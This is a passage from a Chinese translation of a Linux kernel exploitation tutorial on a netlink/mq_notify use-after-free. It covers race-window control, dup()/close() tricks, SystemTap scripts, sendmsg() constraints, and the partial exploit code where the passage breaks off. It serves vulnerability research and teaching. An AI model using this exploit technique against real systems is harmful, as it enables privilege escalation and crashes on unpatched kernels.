调用pthread_create()用于创建线程（即新的task_struct）并启动它。创建任务并不意味着任务将立即运行。为了确保线程已经开始运行，我们使用自旋锁uta-&gt;is_ready。 注：自旋锁是最简单的(active)锁，它循环直到变量状态改变。它active是因为在此期间CPU使用率99%。有人可能想要使用类似原子的变量，但这里不需要，因为只有一个writer和一个reader。 主线程陷入无限循环直到unblock_thread解锁它（将is_ready设置为true）。使用多线程可以实现同样的目的（但它并不总是可用）。注意，这里的自旋锁是可自定义的，它只是对线程创建提供了更多控制。如果使用其他进程来实现这个目的话，通常会干扰到攻击，因为创建进程可能意味着大量内存分配。第3部分将需要相同的技术，所以先不在这里介绍它。 另一方面，我们假设在pthread_create()之后，我们的主线程被抢占了“很长”的时间段（即没有执行）。我们有以下顺序： (图待上传) 在这种情况下，调用setsockopt()在mq_notify阻塞之前。也就是说，setsockopt并不会解锁主线程。这是解锁主线程后进行sleep的原因。换句话说，它至少有5秒钟的时间来调用mq_notify()，可以放心地认为5秒钟足够，因为： 如果主线程在5秒后仍然被抢占，则目标系统负载很重，也无论如何都没办法执行exploit 如果unblock_thread与主线程（setsockopt在mq_notify()之前执行）竞争，那么我们总是可以发送一个CTRL+C命令。这样会使得netlink_attachskb()返回-ERESTARTSYS。该路径中未触发bug，我们可以重新运行exploit 换句话说，“受控窗口”的持续时间现在是5秒。有的人可能认为这种方式有点简陋，但问题是主线程没用办法通知对方将其唤醒，因为它被阻塞。也许unblock_thread可能可以以某种方式去查询某些信息，但在这里使用sleep就足够了。 Updating The STAP Script在运行新的exploit之前，我们需要重新修改STAP脚本。现在，我们在调用netlink_attachskb()之前将netlink socket(fd=3)移除，这意味着我们在进入netlink_attachskb()之后调用setsockopt时，sock_fd是无效的，从而导致setsockopt调用失败。所以我们需要在netlink_attachskb()返回时移除fd 3： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function force_trigger_before:long (arg_sock:long)%&#123; struct netlink_sock &#123; /* struct sock has to be the first member of netlink_sock */ struct sock sk; u32 portid; u32 dst_portid; u32 dst_group; u32 flags; u32 subscriptions; u32 ngroups; unsigned long *groups; unsigned long state; size_t max_recvmsg_len; wait_queue_head_t wait; bool cb_running; struct netlink_callback cb; struct mutex *cb_mutex; struct mutex cb_def_mutex; void (*netlink_rcv)(struct sk_buff *skb); int (*netlink_bind)(int group); void (*netlink_unbind)(int group); struct module *module; &#125;; struct sock *sk = (void*) STAP_ARG_arg_sock; struct netlink_sock *nlk = (void*) sk; nlk-&gt;state |= 1; // enter the netlink_attachskb() retry path // NOTE: We do not mark the sock as DEAD anymore%&#125;function force_trigger_after:long (arg_sock:long)%&#123; struct files_struct *files = current-&gt;files; struct fdtable *fdt = files_fdtable(files); fdt-&gt;fd[3] = NULL; // makes the second call to fget() fails%&#125;probe kernel.function("netlink_attachskb")&#123; if (execname()=="exploit") &#123; printf("(%d-%d) &gt;&gt;&gt; netlink_attachskb (%s)\n", pid(), tid(), $$parms) force_trigger_before($sk) &#125;&#125;probe kernel.function("netlink_attachskb").return&#123; if (execname()=="exploit") &#123; printf("(%d-%d) &lt;&lt;&lt; netlink_attachskb = %x\n", pid(), tid(), $return) force_trigger_after(0) &#125;&#125; 我们在netlink_attachskb()中被阻塞5秒，然后另一线程将主线程恢复并使得netlink_attachskb()返回了1。 在本节中，我们知道了如何控制竞争并无限延长窗口（设置为了5秒）。然后我们使用setsockopt唤醒主线程。 我们还介绍了可能在我们的漏洞利用中发生的条件竞争，我们了解了如何通过简单的技巧降低其发生概率。最后，我们仅使用用户态代码删除了由旧脚本满足的一个要求（将SOCK标记为DEAD）。 Making fget() Fail on Second Loop到此为止，我们还有两个要求需要满足： 强制netlink_attachskb()返回1 强制第二次fget()返回NULL [已完成]唤醒主线程 在本章节中，我们将会尝试让第二次fget()返回NULL，这将让我们在第二次循环中进入到exit的路径： 123456retry: filp = fget(notification.sigev_signo); if (!filp) &#123; ret = -EBADF; goto out; // &lt;--------- on the second loop only! &#125; 为什么fget()会返回NULL通过System Tap，重置目标fd的FDT项能够使得fget()返回NULL： 123struct files_struct *files = current-&gt;files;struct fdtable *fdt = files_fdtable(files);fdt-&gt;fd[3] = NULL; // makes the second call to fget() fails fget()所做的事： 获得current进程的结构体files_struct 获得结构体files_struct的fdtable结构体 获得fdt-&gt;fd[fd]的值 将file结构体的refcounter（如果不为NULL）递增1 返回file结构体的指针 简而言之，如果特定文件描述符的FDT条目为NULL，则fget()返回NULL。 Reset an Entry in the File Descriptor Table在STAP脚本中，我们重置了fd 3的fdt入口。我们如何在用户态中完成这件事？有什么办法可以设置fdt？答案就是close()系统调用。 123456789101112131415 // [fs/open.c] SYSCALL_DEFINE1(close, unsigned int, fd) &#123; struct file * filp; struct files_struct *files = current-&gt;files; struct fdtable *fdt; int retval;[0] fdt = files_fdtable(files);[1] filp = fdt-&gt;fd[fd];[2] rcu_assign_pointer(fdt-&gt;fd[fd], NULL); // &lt;----- equivalent to: fdt-&gt;fd[fd] = NULL[3] retval = filp_close(filp, files); return retval; &#125; close()系统调用： [0] - 获得当前进程的FDT [1] - 通过FDT获得指定fd的file结构体 [2] - 将相应的FDT项设置为NULL（无条件） [3] - 将file的引用减去1（即调用fput()） 因此，这种简单的方法可以重置FDT条目。 然而，它带来了另一个问题。 An Egg and Chicken Issue…在调用setsockopt()之前调用unblock_thread中的close()是很诱人的。问题是setsockopt()需要一个有效的文件描述符。我们已经通过STAP尝试过它，这就是为什么我们在从netlink_attachskb()返回时添加了fdt重置的代码，而不是netlink_attachskb()调用之前。我们在用户态中遇到同样的问题…… 在setsocktopt()之后调用close()会怎么样？如果我们在调用setsockopt()（唤醒主线程）之后调用close()，就不利用扩展的条件竞争的窗口。我们不希望这样。 幸运的是，在Core Concept＃1中，已经说过文件描述符表不是1：1映射。也就是说，几个文件描述符可能指向同一个文件对象。如何使两个文件描述符指向相同的struct文件？使用dup()系统调用。 12345678910111213141516 // [fs/fcntl.c] SYSCALL_DEFINE1(dup, unsigned int, fildes) &#123; int ret = -EBADF;[0] struct file *file = fget(fildes); if (file) &#123;[1] ret = get_unused_fd(); if (ret &gt;= 0)[2] fd_install(ret, file); // &lt;----- equivalent to: current-&gt;files-&gt;fdt-&gt;fd[ret] = file else fput(file); &#125;[3] return ret; &#125; dup()的操作正式我们想要的： [0] - 从文件描述符中获取文件对象的引用 [1] - 选择一个可用的fd [2] - 使用指向struct file对象的指针设置此新文件描述符的fdt条目 [3] - 返回新的fd 最后，我们将拥有两个引用相同file结构体的文件描述符： sock_fd：被mq_notify()和close()使用 unblock_fd：被setsockopt()使用 更新Exploit123456789101112131415161718192021222324252627282930313233343536struct unblock_thread_arg&#123; int sock_fd; int unblock_fd; // &lt;----- used by the "unblock_thread" bool is_ready;&#125;;static void* unblock_thread(void *arg)&#123; // ... cut ... sleep(5); // gives some time for the main thread to block printf("[unblock] closing %d fd\n", uta-&gt;sock_fd); _close(uta-&gt;sock_fd); // &lt;----- close() before setsockopt() printf("[unblock] unblocking now\n"); if (_setsockopt(uta-&gt;unblock_fd, SOL_NETLINK, // &lt;----- use "unblock_fd" now! NETLINK_NO_ENOBUFS, &amp;val, sizeof(val))) perror("setsockopt"); return NULL;&#125;int main(void)&#123; // ... cut ... if ((uta.unblock_fd = _dup(uta.sock_fd)) &lt; 0) // &lt;----- dup() after socket() &#123; perror("dup"); goto fail; &#125; printf("[main] netlink fd duplicated = %d\n", uta.unblock_fd); // ... cut ...&#125; 移除STAP脚本中的FDT清空代码后执行。测试结果如下： 12345678910111213141516171819202122232425262728293031323334(2853-2853) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffdc2f2f1b0)(2853-2853) &gt;&gt;&gt; copy_from_user()(2853-2853) &gt;&gt;&gt; alloc_skb (priority=? size=?)(2853-2853) &gt;&gt;&gt; copy_from_user()(2853-2853) &gt;&gt;&gt; skb_put (skb=0xffff88003e3c1e00 len=0x20)(2853-2853) &lt;&lt;&lt; skb_put = ffff880037398000(2853-2853) &gt;&gt;&gt; __fdget (fd=0x3)(2853-2853) &lt;&lt;&lt; __fdget = ffff880038cb1501(2853-2853) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880038cb1500)(2853-2853) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003b8f9800(2853-2853) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003b8f9800 skb=0xffff88003e3c1e00 timeo=0xffff880036ad3f08 ssk=0x0)(2853-2854) &gt;&gt;&gt; __fdget (fd=?)(2853-2854) &gt;&gt;&gt; copy_from_user()(2853-2854) &gt;&gt;&gt; __fdget (fd=?)(2853-2854) &gt;&gt;&gt; copy_from_user()(2853-2854) &gt;&gt;&gt; __fdget (fd=0x4)(2853-2854) &lt;&lt;&lt; __fdget = ffff880038cb1501(2853-2853) &lt;&lt;&lt; netlink_attachskb = 1(2853-2853) &gt;&gt;&gt; __fdget (fd=0x3)(2853-2853) &lt;&lt;&lt; __fdget = 0(2853-2853) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003b8f9800 skb=0xffff88003e3c1e00)(2853-2853) &gt;&gt;&gt; kfree (objp=0xffff880037398000)(2853-2853) &gt;&gt;&gt; kfree (objp=0xffff88003b8f9800)(2853-2853) &lt;&lt;&lt; netlink_detachskb-=&#123; dump_netlink_sock: 0xffff88003b8f9800 &#125;=-- sk = 0xffff88003b8f9800- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 212992- sk-&gt;sk_refcnt = 0- nlk-&gt;state = 0- sk-&gt;sk_flags = 100- SOCK_DEAD = 0-=&#123; dump_netlink_sock: END&#125;=-(2853-2853) &lt;&lt;&lt; mq_notify = fffffffffffffff7 Long story short: because of dup(), calling close() will not release a reference on netlink_sock object. It is the netlink_detachskb() that actually releases the last reference on netlink_sock (and frees it). In the end, the use-after-free is triggered during program exit, while releasing the “unblock_fd” file descriptor (in netlink_release()). 原文中触发了Kernel Panic，但是实际测试的时候并没有导致Kernel Panic，为了验证所使用的系统的正确性，使用了本文后续的poc进行验证，是能够导致Kernel Panic的，不知道本章节的exploit的问题在哪。 Looping back to “retry” label来看下我们的待办事项： 强制netlink_attachskb()返回1 [已完成]强制第二次fget()返回NULL [已完成]唤醒主线程 为了到达retry标签，就需要netlink_attachskb()返回1。唯一的办法就是需要满足下列条件并唤醒线程（这个条件已经满足）： 1234567891011121314 int netlink_attachskb(struct sock *sk, struct sk_buff *skb, long *timeo, struct sock *ssk) &#123; struct netlink_sock *nlk; nlk = nlk_sk(sk);[0] if (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) &#123; // ... cut ... return 1; &#125; // normal path return 0; &#125; [0]的条件为True的要求： sk_rmem_alloc的值比sk_rcvbuf大，或者 nlk-&gt;state的最低比特位被设置 我们现在所使用的办法是用STAP脚本强制修改nlk-&gt;state： 123struct sock *sk = (void*) STAP_ARG_arg_sock;struct netlink_sock *nlk = (void*) sk;nlk-&gt;state |= 1; 但是实际中如果要这么设置，就只能让内核内存分配失败。这将会导致系统处于一个不稳定的状态从而影响我们的exploit。所以我们只能尝试增加sk_rmem_alloc的值，这个值用于表示“当前”sock的接收buf的大小。 Filling The Receive Buffer在这一小节中，我们尝试满足第一个条件。满足这个条件意味着接收buf是否已满： 1atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf sock结构体（包含在netlink_sock结构体中）有以下属性： sk_rcvbuf：理论上接收buf大小的最大值（字节数） sk_rmem_alloc：当前接收buf的大小（字节数） sk_receive_queue：”skb”双向链表 (i.e. network buffers) NOTE：“理论上”的意思是，sk_rmem_alloc实际上是可以超过sk_rcvbuf的。 在Part 1中我们使用STAP输出了netlink sock结构： 12- sk-&gt;sk_rmem_alloc = 0- sk-&gt;sk_rcvbuf = 133120 我们有两种办法来满足这个条件： 将sk_rcvbuf减到0一下（类型是int） 增加sk_rmem_alloc到133120以上 Lowering sk_rcvbufsk_rcvbuf在sock对象中十分常见，但netlink socket并没有很多地方对其值进行了修改。有一处就是sock_setsockopt（使用SOL_SOCKET可达）。 1234567891011121314151617181920212223 // from [net/core/sock.c] int sock_setsockopt(struct socket *sock, int level, int optname, char __user *optval, unsigned int optlen) &#123; struct sock *sk = sock-&gt;sk; int val; // ... cut ... case SO_RCVBUF:[0] if (val &gt; sysctl_rmem_max) val = sysctl_rmem_max; set_rcvbuf: sk-&gt;sk_userlocks |= SOCK_RCVBUF_LOCK;[1] if ((val * 2) &lt; SOCK_MIN_RCVBUF) sk-&gt;sk_rcvbuf = SOCK_MIN_RCVBUF; else sk-&gt;sk_rcvbuf = val * 2; break; // ... cut (other options handling) ... &#125; 当见到诸如此类的代码时，注意每一个参数的类型。 注意：A lot of bugs exist because of this “signed/unsigned type mixing”. The same goes when casting a bigger type (u64) to a smaller type (u32). This often leads to int overflow or type casting issues. 在上述代码中（可能因内核版本不一而不一样）： sk_rcvbuf: int val: int sysctl_rmem_max: __u32 SOCK_MIN_RCVBUF: “promoted” to size_t because of “sizeof()” SOCK_MIN_RCVBUF定义如下： 1#define SOCK_MIN_RCVBUF (2048 + sizeof(struct sk_buff)) 总而言之，当混合signed int和unsigned int时，signed int会被转换为unsigned int。 WARNING：不同的编译器可能有不同的策略，以汇编为准。 让我们来考虑将一个负值传递给val，代码运行至[0]，它会被转化成无符号数（因为sysctl_rmem_max是__u32），所以val在这会被重置为sysctl_rmem_max。如果val不被转为__u32的话，将不会通过[1]处的检查。在最后，sk_rcvbuf的取值范围为[SOCK_MIN_RCVBUF, sysctl_rmem_max]。 所以我们只能操作sk_rmem_alloc来达到我们的目的。 注意：While developing an exploit you will meet this phenomenon: analyzing a lot of code paths that actually lead to nowhere. We wanted to expose it in this article. Back to the “normal” path现在是时候回到我们自本系列一直忽略的东西：mq_notify()的normal path。从概念上讲，当sock接收buffer已满时，存在“retry path”，因为normal path可能实际填充它。 在netlink_attachskb()： 1234567891011int netlink_attachskb(struct sock *sk, struct sk_buff *skb, long *timeo, struct sock *ssk)&#123; struct netlink_sock *nlk; nlk = nlk_sk(sk); if (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(0, &amp;nlk-&gt;state)) &#123; // ... cut (retry path) ... &#125; skb_set_owner_r(skb, sk); // &lt;----- what about this ? return 0;&#125; 所以，normal path调用skb_set_owner_r()： 123456789 static inline void skb_set_owner_r(struct sk_buff *skb, struct sock *sk) &#123; WARN_ON(skb-&gt;destructor); __skb_orphan(skb); skb-&gt;sk = sk; skb-&gt;destructor = sock_rfree;[0] atomic_add(skb-&gt;truesize, &amp;sk-&gt;sk_rmem_alloc); // sk-&gt;sk_rmem_alloc += skb-&gt;truesize sk_mem_charge(sk, skb-&gt;truesize); &#125; 是的，skb_set_owner_r()使用skb-&gt;truesize增加sk_rmem_alloc。所以，我们是否可以多次调用mq_notify()直到接收buffer装满？不幸的是我们没办法简单的达成这件事。 在mq_notify()的normal path中，在函数的开头创建了一个skb(被称为cookie)，并使用netlink_attachskb()附加到netlink_sock，我们之前已经介绍过了。netlink_sock和skb都与属于消息队列的mqueue_inode_info结构相关。 问题是，一次只能有一个cookie “skb”与mqueue_inode_info结构相关联。也就是说，第二次调用mq_notify()将失败并显示“-EBUSY”错误。换句话说，我们只能增加sk_rmem_alloc大小一次（对于给定的消息队列），这是不够（只有32个字节）使它大于sk_rcvbuf。 我们实际上可能创建多个消息队列，因此拥有多个mqueue_inode_info对象并多次调用mq_notify()。或者，我们也可以使用mq_timedsend()系统调用将消息推送到队列中。 因为我们不想研究另一个子系统（mqueue），并且坚持使用“通用”内核路径（sendmsg），所以我们不会这样做。虽然这可能是一个很好的锻炼。 NOTE: There are always multiple ways to code an exploit. 虽然我们不会采用mq_notify()的normal path，但它仍然暴露了一件重要的事情：我们可以使用skb_set_owner_r()，也就是netlink_attachskb()增加sk_rmem_alloc。 The netlink_unicast() path在skb_set_owner_r()的帮助下，netlink_attachskb()可能会增加sk_rmem_alloc的值。netlink_attachskb()同样由netlink_unicast()调用。让我们自下而上来分析下如何通过系统调用到达netlink_unicast()： 12345678910- skb_set_owner_r- netlink_attachskb- netlink_unicast - netlink_sendmsg // there is a lots of "other" callers of netlink_unicast- sock-&gt;ops-&gt;sendmsg() - __sock_sendmsg_nosec()- __sock_sendmsg()- sock_sendmsg()- __sys_sendmsg()- SYSCALL_DEFINE3(sendmsg, ...) 因为netlink_sendmsg()是netlink sockets的一个操作原型，所以我们可以通过sendmsg()系统调用到达它。 从sendmsg()系统调用到sendmsg的proto_ops（sock-&gt;ops-&gt;sendmsg()）的通用代码路径将在第3部分的更深入地介绍。现在，让我们假设我们可以毫不费力地访问netlink_sendmsg()。 Reaching netlink_unicast() from netlink_sendmsg()sendmsg()系统调用： 1ssize_t sendmsg(int sockfd, const struct msghdr *msg, int flags); 到达netlink_unicast()需要把msg和flags设置为合适的值： 123456789101112131415struct msghdr &#123; void *msg_name; /* optional address */ socklen_t msg_namelen; /* size of address */ struct iovec *msg_iov; /* scatter/gather array */ size_t msg_iovlen; /* # elements in msg_iov */ void *msg_control; /* ancillary data, see below */ size_t msg_controllen; /* ancillary data buffer len */ int msg_flags; /* flags on received message */&#125;;struct iovec&#123; void __user *iov_base; __kernel_size_t iov_len;&#125;; 在本节中，我们将从代码中推断出合适的参数值，并逐步建立我们的“约束”列表。这样做会使内核执行我们想要的路径。内核利用实际上就是这个意思。 这里，对netlink_unicast()的调用位于最后，所以我们需要通过（或跳过）所有检查…… 开始吧： 1234567891011121314151617181920212223242526272829303132 static int netlink_sendmsg(struct kiocb *kiocb, struct socket *sock, struct msghdr *msg, size_t len) &#123; struct sock_iocb *siocb = kiocb_to_siocb(kiocb); struct sock *sk = sock-&gt;sk; struct netlink_sock *nlk = nlk_sk(sk); struct sockaddr_nl *addr = msg-&gt;msg_name; u32 dst_pid; u32 dst_group; struct sk_buff *skb; int err; struct scm_cookie scm; u32 netlink_skb_flags = 0;[0] if (msg-&gt;msg_flags&amp;MSG_OOB) return -EOPNOTSUPP;[1] if (NULL == siocb-&gt;scm) siocb-&gt;scm = &amp;scm; err = scm_send(sock, msg, siocb-&gt;scm, true);[2] if (err &lt; 0) return err; // ... cut ... err = netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT); // &lt;---- our target out: scm_destroy(siocb-&gt;scm); return err; &#125; 标志位MSG_OOB不能被设置以通过[0]处的检查，因此第一个限制条件：msg-&gt;msg_flags MSG_OOB位为0。 为了通过[1]处的检查，需要在__sock_sendmsg_nosec()中设置siocb-&gt;scm为NULL。最后，scm_send()不能返回负值。代码： 1234567891011static __inline__ int scm_send(struct socket *sock, struct msghdr *msg, struct scm_cookie *scm, bool forcecreds)&#123; memset(scm, 0, sizeof(*scm)); if (forcecreds) scm_set_cred(scm, task_tgid(current), current_cred()); unix_get_peersec_dgram(sock, scm); if (msg-&gt;msg_controllen &lt;= 0) // &lt;----- this need to be true... return 0; // &lt;----- ...so we hit this and skip __scm_send() return __scm_send(sock, msg, scm);&#125; 因此，第二个限制条件：msg-&gt;msg_controllen (size_t) 为0。继续： 123456789101112131415161718 // ... netlink_sendmsg() continuation ...[0] if (msg-&gt;msg_namelen) &#123; err = -EINVAL;[1] if (addr-&gt;nl_family != AF_NETLINK) goto out;[2a] dst_pid = addr-&gt;nl_pid;[2b] dst_group = ffs(addr-&gt;nl_groups); err = -EPERM;[3] if ((dst_group || dst_pid) &amp;&amp; !netlink_allowed(sock, NL_NONROOT_SEND)) goto out; netlink_skb_flags |= NETLINK_SKB_DST; &#125; else &#123; dst_pid = nlk-&gt;dst_pid; dst_group = nlk-&gt;dst_group; &#125; // ... cut ... 好的，这个有点棘手。 此块取决于sender socket是否已连接到目标（receiver）socket。 如果是，则nlk-&gt; dst_pid和nlk-&gt; dst_group都已设置。由于我们不想连接到receiver socket（可能会有副作用），想采取第一个分支，那就要求msg-&gt;msg_namelen必须不等于零[0]。 如果我们回过头看函数一开始的地方，我们可以发现addr是另一个我们可以控制的参数：msg-&gt;msg_name。在[2a]和[2b]的帮助下，我们可以任意写入dst_group和dst_pid。控制这些允许我们： dst_group == 0：send a unicast message instead of broadcast (cf. man 7 netlink) dst_pid != 0：talk to the receiver socket (userland) of our choice. Zero meaning “talk to the kernel” (read the manual!). Which we translate in the constraint list into (msg_name被转为sockaddr_nl): msg-&gt;msg_name-&gt;dst_group为0 msg-&gt;msg_name-&gt;dst_pid等于”destination” socket nl_pid 但是，这意味着netlink_allowed(sock, NL_NONROOT_SEND) [3]不会返回0： 1234static inline int netlink_allowed(const struct socket *sock, unsigned int flag)&#123; return (nl_table[sock-&gt;sk-&gt;sk_protocol].flags &amp; flag) || capable(CAP_NET_ADMIN));&#125; 因为我们不是特权用户，所以没有CAP_NET_ADMIN标记位。唯一拥有NL_NONROOT_SEND标记位的netlink协议是NETLINK_USERSOCK。也就是说，sender socket必须使用NETLINK_USERSOCK协议。 另外在[1]中，我们需要 msg-&gt;msg_name-&gt;nl_family等于AF_NETLINK。 下一步： 12345[0] if (!nlk-&gt;pid) &#123;[1] err = netlink_autobind(sock); if (err) goto out; &#125; 我们无法控制[0]处的检查，因为在socket创建期间，套接字的pid被设置为零（整个结构由sk_alloc()清零）。但netlink_autobind() [1]将为我们的sender socket找到“可用”pid并且它不会失败。在第二次调用sendmsg()时将跳过检查，此时将设置nlk-&gt;pid。下一个： 1234567 err = -EMSGSIZE;[0] if (len &gt; sk-&gt;sk_sndbuf - 32) goto out; err = -ENOBUFS; skb = alloc_skb(len, GFP_KERNEL);[1] if (skb == NULL) goto out; 在这，len在__sys_sendmsg()中被计算，这是所有iovec的长度和。所以，所有iovecs的总和必须小于sk-&gt; sk_sndbuf减去32 [0]。为了简单起见，我们将使用单个iovec，就是： msg-&gt;msg_iovlen等于1 // a single iovec msg-&gt;msg_iov-&gt;iov_len小于等于sk-&gt;sk_sndbuf减去32 msg-&gt;msg_iov-&gt;iov_base需要用户态可读地址 // 否则__sys_sendmsg()会失败 最后一个限制是msg-&gt;msg_iov同样需要用户态可读地址（否则__sys_sendmsg()会失败） NOTE：sk_sndbuf相当于sk_rcvbuf，但对于发送缓冲区，我们可以使用sock_getsockopt()选项SO_SNDBUF检索其值。 [1]处的检查几乎不会不通过，如果不通过意味着内核已经用尽了内存。 下一块代码可以忽略（没有通过任何检查的需求），siocb-&gt;scm结构体在scm_send()中初始化： 1234NETLINK_CB(skb).pid = nlk-&gt;pid;NETLINK_CB(skb).dst_group = dst_group;memcpy(NETLINK_CREDS(skb), &amp;siocb-&gt;scm-&gt;creds, sizeof(struct ucred));NETLINK_CB(skb).flags = netlink_skb_flags; 接着： 12345 err = -EFAULT;[0] if (memcpy_fromiovec(skb_put(skb, len), msg-&gt;msg_iov, len)) &#123; kfree_skb(skb); goto out; &#125; [0]处同样没有任何问题因为我们已经提供了可读的iovec，除非__sys_sendmsg()调用失败。 12345[0] err = security_netlink_send(sk, skb); if (err) &#123; kfree_skb(skb); goto out; &#125; 这是LSM的检查。如果我们不能通过这个检查，就需要寻找其它途径到达netlink_unicast()或者另一种增加sk_rmem_alloc的方法（例如尝试netlink_dump()）。我们假设我们通过了这个检查。 最后： 12345[0] if (dst_group) &#123; atomic_inc(&amp;skb-&gt;users); netlink_broadcast(sk, skb, dst_pid, dst_group, GFP_KERNEL); &#125;[1] err = netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT); 记住dst_group被赋值为msg-&gt;msg_name-&gt;dst_group。既然我们强制让他为0，我们能够跳过[0]处并最终到达netlink_unicast()。 让我们总结一下从netlink_sendmsg()到达netlink_unicast()的条件： msg-&gt;msg_flags doesn’t have the MSG_OOB flag msg-&gt;msg_controllen equals 0 msg-&gt;msg_namelen is different from zero msg-&gt;msg_name-&gt;nl_family equals AF_NETLINK msg-&gt;msg_name-&gt;nl_groups equals 0 msg-&gt;msg_name-&gt;nl_pid is different from 0 and points to the receiver socket the sender netlink socket must use the NETLINK_USERSOCK protocol msg-&gt;msg_iovlen equals 1 msg-&gt;msg_iov is a readable userland address msg-&gt;msg_iov-&gt;iov_len is lesser than or equals to sk_sndbuf minus 32 msg-&gt;msg_iov-&gt;iov_base is a readable userland address 我们在这里看到的是内核开发者的工作。分析每个检查，强制执行特定的内核路径，定制系统调用参数等。实际上，分析这些条件的时间并不长。有些路径比这更复杂。 让我们继续前进，研究如何到达netlink_attachskb()。 Reach netlink_attachskb() from netlink_unicast()netlink_unicast()有以下参数： 1netlink_unicast(sk, skb, dst_pid, msg-&gt;msg_flags&amp;MSG_DONTWAIT); sk is our sender netlink_sock skb is a socket buffer filled with msg-&gt;msg_iov-&gt;iov_base data of size msg-&gt;msg_iov-&gt;iov_len dst_pid is a controlled pid (msg-&gt;msg_name-&gt;nl_pid) pointing to our receiver netlink socket msg-&gt;msg_flasg&amp;MSG_DONTWAIT indicates if netlink_unicast() should block or not WARNING: Inside the netlink_unicast() code “ssk” is the sender socket and “sk” the receiver. netlink_unicast()： 12345678910111213141516171819202122232425262728293031323334 int netlink_unicast(struct sock *ssk, struct sk_buff *skb, u32 pid, int nonblock) &#123; struct sock *sk; int err; long timeo; skb = netlink_trim(skb, gfp_any()); // &lt;----- ignore this[0] timeo = sock_sndtimeo(ssk, nonblock); retry:[1] sk = netlink_getsockbypid(ssk, pid); if (IS_ERR(sk)) &#123; kfree_skb(skb); return PTR_ERR(sk); &#125;[2] if (netlink_is_kernel(sk)) return netlink_unicast_kernel(sk, skb, ssk);[3] if (sk_filter(sk, skb)) &#123; err = skb-&gt;len; kfree_skb(skb); sock_put(sk); return err; &#125;[4] err = netlink_attachskb(sk, skb, &amp;timeo, ssk); if (err == 1) goto retry; if (err) return err;[5] return netlink_sendskb(sk, skb); &#125; [0]处，sock_sndtimeo()根据nonblock设置timeo(timeout)的值。因为我们不想阻塞（nonblock&gt;0），timeo将会是0。所以msg-&gt;msg_flags必须设置MSG_DONTWAIT标志。 [1]处，目标netlink_sock “sk”通过pid获取，正如我们将在下一节中看到的那样，在使用netlink_getsockbypid()检索之前，需要绑定目标netlink_sock 。 [2]处，目标socket必须不是一个内核socket。一个netlink sock如果有NETLINK_KERNEL_SOCKET标志，它将被认为是内核的。这意味着它是通过netlink_kernel_create()函数创建的。不幸的是，NETLINK_GENERIC是他们的其中之一。所以我们也将receiver socket的协议更改为NETLINK_USERSOCK。请注意，receiver netlink_sock上有一个引用。（ Note that a reference is taken on receiver netlink_sock） [3]处，可能会有BPF sock过滤器被应用，如果没有为receiver sock创建任何BPF过滤器，那么这里可以跳过。 It means that it has been created with the netlink_kernel_create() function. Unfortunately, the NETLINK_GENERIC is one of them (from current exploit). So let’s change the receiver socket protocol to NETLINK_USERSOCK as well. It also makes more sense by the way… Note that a reference is taken on receiver netlink_sock. 接着就是[4]处调用netlink_attachskb()！在netlink_attachskb()中，我们保证采用其中一条路径： the receiver buffer is not full: call skb_set_owner_r() -&gt; increase sk_rmem_alloc the receiver buffer is full: netlink_attachskb() do not block and return -EAGAIN (timeout is zero) 也就是说，我们有办法知道接收缓冲区何时已满（只需检查sendmsg()的错误代码）。 最后，[5]处调用netlink_sendskb()将skb添加到receiver buffer列表并删除netlink_getsockbypid()的引用。 条件限制： msg-&gt;msg_flags has the MSG_DONTWAIT flag set the receiver netlink socket must be bound prior calling sendmsg() the receiver netlink socket must use the NETLINK_USERSOCK protocol don’t define any BPF filter for the receiver socket 我们现在非常接近最终的PoC，我们只需要绑定接收器套接字。 Binding the receiver socket与任何socket通信一样，两个socket可以使用“地址”进行通信。由于我们正在操作netlink socket，我们将使用struct sockaddr_nl类型： 123456struct sockaddr_nl &#123; sa_family_t nl_family; /* AF_NETLINK */ unsigned short nl_pad; /* Zero. */ pid_t nl_pid; /* Port ID. */ __u32 nl_groups; /* Multicast groups mask. */&#125;; 由于我们不想成为broadcast group的一部分，因此nl_groups必须为零。这里唯一重要的字段是nl_pid。 基本上，netlink_bind()有两条路径： nl_pid is not zero: it calls netlink_insert() nl_pid is zero: it calls netlink_autobind(), which in turn calls netlink_insert() 请注意，使用已使用的pid调用netlink_insert()将失败，并显示错误-EADDRINUSE。 否则，在nl_pid和netlink sock之间创建映射。也就是说，现在可以使用netlink_getsockbypid()检索netlink sock。此外，netlink_insert()将sock引用计数器增加1。请记住这件事情。 注意：第4部分将详细介绍netlink如何存储“pid:netlink_sock”映射。 虽然调用netlink_autobind()看起来更自然，但我们实际上是通过遍历pid值（这是autobind做的）直到bind()成功。直接设置nl_pid允许我们直接获取目标nl_pid值而不调用getsockname()，并且（可能）简化调试。 Putting It All Together分析所有这些路径都需要很长的时间，但是我们现在已经准备好在exploit中实施它并最终实现我们的目标：让netlink_attachskb()返回1。 一些策略： 使用NETLINK_USERSOCK协议创建两个AF_NETLINK socket 绑定目标（receiver）socket（即必须使其接收缓冲区已满的socket） [可选]尝试减少目标socket的接收缓冲区（减少对sendmsg()的调用） 通过sender socket中的sendmsg()填充目标socket，直到它返回EAGAIN 关闭sender socket（不再需要它了） 你可以独立运行以下代码，以验证一切正常： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576static int prepare_blocking_socket(void)&#123; int send_fd; int recv_fd; char buf[1024*10]; // should be less than (sk-&gt;sk_sndbuf - 32), you can use getsockopt() int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF struct sockaddr_nl addr = &#123; .nl_family = AF_NETLINK, .nl_pad = 0, .nl_pid = 118, // must different than zero .nl_groups = 0 // no groups &#125;; struct iovec iov = &#123; .iov_base = buf, .iov_len = sizeof(buf) &#125;; struct msghdr mhdr = &#123; 